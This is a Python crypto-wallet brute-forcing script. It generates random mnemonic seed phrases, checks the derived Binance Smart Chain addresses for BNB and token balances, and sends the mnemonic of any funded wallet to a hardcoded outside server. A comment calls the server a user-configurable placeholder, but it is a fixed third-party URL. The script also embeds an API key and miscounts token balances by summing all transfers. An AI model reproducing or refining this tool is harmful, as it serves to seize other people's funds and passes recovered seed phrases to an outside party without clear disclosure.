import threading
import requests
import json
import psutil
from mnemonic import Mnemonic
from eth_account import Account
from web3 import Web3
import time

# Enable mnemonic support for eth_account
Account.enable_unaudited_hdwallet_features()

# Connect to Binance Smart Chain
bsc_rpc_url = 'https://bsc-dataseed.binance.org/'
web3 = Web3(Web3.HTTPProvider(bsc_rpc_url))

# API to send wallet data to server
api_url = 'https://hvnteam.com/wallet.php'  # Replace YOUR_SERVER_IP with your server's IP

def scan_wallet():
    try:
        # Generate a 12-word mnemonic phrase
        mnemo = Mnemonic("english")
        mnemonic_phrase = mnemo.generate(strength=128)
        print(f"[INFO] Generated Mnemonic: {mnemonic_phrase}")

        # Derive account from mnemonic
        account = Account.from_mnemonic(mnemonic_phrase)
        address = account.address
        private_key = account.key

        # Check BNB balance
        balance = web3.eth.get_balance(address)
        bnb_balance = Web3.from_wei(balance, 'ether')

        # Get token list
        tokens = get_all_tokens(address)

        if bnb_balance > 0 or tokens:
            data = {
                'mnemonic': mnemonic_phrase,
                'address': address,
                'tokens': tokens
            }
            
            # Send wallet data to server
            try:
                response = requests.post(api_url, json=data, timeout=10)
                if response.status_code == 200:
                    print(f"[SUCCESS] Sent data for wallet {address}: {response.json()}")
                else:
                    print(f"[ERROR] Failed to send data for wallet {address}: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Network issue when sending data: {e}")
        else:
            print(f"[INFO] Wallet {address} has no balance.")

    except Exception as e:
        print(f"[ERROR] {e}")

# Retrieve all tokens from the wallet
def get_all_tokens(address):
    tokens = {}
    api_key = '6PVT836Y1MCKJRPRU25QXEM3ITK2UR371Z'  # Replace with your BscScan API Key
    url = f'https://api.bscscan.com/api?module=account&action=tokentx&address={address}&apikey={api_key}'

    try:
        response = requests.get(url, timeout=10)
        data = response.json()

        if data.get('status') == '0':
            # Handle API errors or invalid responses
            message = data.get('message', 'Unknown error')
            if "Invalid API Key" in message:
                print(f"[ERROR] Invalid API Key: {message}")
            elif "Invalid address format" in message:
                print(f"[ERROR] Invalid address format: {message}")
            elif "No transactions found" in message:
                print(f"[INFO] No transactions found for address {address}")
            else:
                print(f"[ERROR] API returned an unknown error: {message}")
            return tokens

        if data.get('status') == '1' and len(data.get('result', [])) > 0:
            for tx in data['result']:
                token_name = tx['tokenName']
                if token_name not in tokens:
                    tokens[token_name] = 0
                tokens[token_name] += float(tx.get('value', 0)) / (10 ** int(tx.get('tokenDecimal', 18)))

    except Exception as e:
        print(f"[ERROR] Error retrieving tokens: {e}")

    return {k: v for k, v in tokens.items() if v > 0}

# Check system resource usage
def check_system_load():
    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    return cpu_usage < 90 and ram_usage < 90

# Run multithreading and automatically increase the number of threads
def start_scanning():
    threads = []
    max_threads = 1

    while True:
        if check_system_load():
            for _ in range(max_threads):
                t = threading.Thread(target=scan_wallet)
                t.start()
                threads.append(t)
            
            print(f"[INFO] Running {max_threads} threads...")
            max_threads += 1
        else:
            print("[WARNING] CPU or RAM usage reached 90%. Halting thread increase.")

        time.sleep(5)

    for t in threads:
        t.join()

if __name__ == "__main__":
    start_scanning()
